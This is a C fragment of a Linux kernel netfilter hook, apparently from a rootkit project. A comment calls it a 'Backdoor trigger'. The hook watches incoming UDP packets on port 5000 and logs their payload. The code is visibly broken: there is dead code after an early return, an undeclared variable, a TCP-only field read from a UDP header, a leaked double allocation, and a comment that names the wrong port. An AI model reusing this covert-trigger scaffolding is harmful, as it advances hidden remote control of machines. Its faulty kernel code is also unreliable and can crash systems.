static unsigned int my_nf_hookfn(void *priv,
              struct sk_buff *skb,
              const struct nf_hook_state *state)
{
    struct iphdr *iph;
	struct udphdr *udph;
	if (!skb)
		return NF_ACCEPT;

	iph = ip_hdr(skb);
	if (iph->protocol == IPPROTO_UDP) {
		udph = udp_hdr(skb);
		if (ntohs(udph->dest) == 53) {
			return NF_ACCEPT;
		}
	}
	
	return NF_ACCEPT;




      //Network headers
    struct iphdr *ip_header;        //ip header
	struct udphdr *udph;
    struct sk_buff *sock_buff = skb;//sock buffer
    char *user_data;       //data header pointer
    //Auxiliar
    int size;                       //payload size
    char* _data;
    struct udphdr _udphdr;
    struct iphdr _iph;
    char ip_source[16];
    //char port[16];

    if (!sock_buff){
        return NF_ACCEPT; //socket buffer empty
    }
    
    ip_header = skb_header_pointer(skb, 0, sizeof(_iph), &_iph);
    if (!ip_header){
        return NF_ACCEPT;
    }

    //Backdoor trigger: udp
    if(ip_header->protocol==IPPROTO_UDP)
    { 
        unsigned int dport;
        unsigned int sport;

        udp_header = skb_header_pointer(skb, ip_header->ihl * 4, sizeof(_udphdr), &_udphdr);

        sport = htons((unsigned short int) udp_header->source);
        dport = htons((unsigned short int) udp_header->dest);
        if(dport != 5000) //TODO change port
        {
            return NF_ACCEPT; //We ignore those not for port 9000
        }
        printk(KERN_INFO "poet:: Received packet on port 5000\n");
             

        //size = htons(ip_header->tot_len) - ip_header->ihl*4 - udp_header->doff*4;
        size = htons(ip_header->tot_len) - sizeof(_iph) - udp_header->doff*4;
        _data = kmalloc(size, GFP_KERNEL);

        if (!_data)
            return NF_ACCEPT;

        _data = kmalloc(size, GFP_KERNEL);
        user_data = skb_header_pointer(skb, ip_header->ihl*4 + udp_header->doff*4, size, &_data);
        if(!user_data)
        {
            printk(KERN_INFO "NULL INFO");
            kfree(_data);
            return NF_ACCEPT;
        }

        printk(KERN_DEBUG "data len : %d\ndata : \n", (int)strlen(user_data));
        printk(KERN_DEBUG "%s\n", user_data);

        if(strlen(user_data)<10){
            return NF_ACCEPT;
        }

        return NF_ACCEPT;

    }
    return NF_ACCEPT;
}

struct nf_hook_ops my_nfho = {
      .hook        = my_nf_hookfn,
      .hooknum     = NF_INET_PRE_ROUTING,
      .pf          = PF_INET,
      .priority    = NF_IP_PRI_FIRST
};
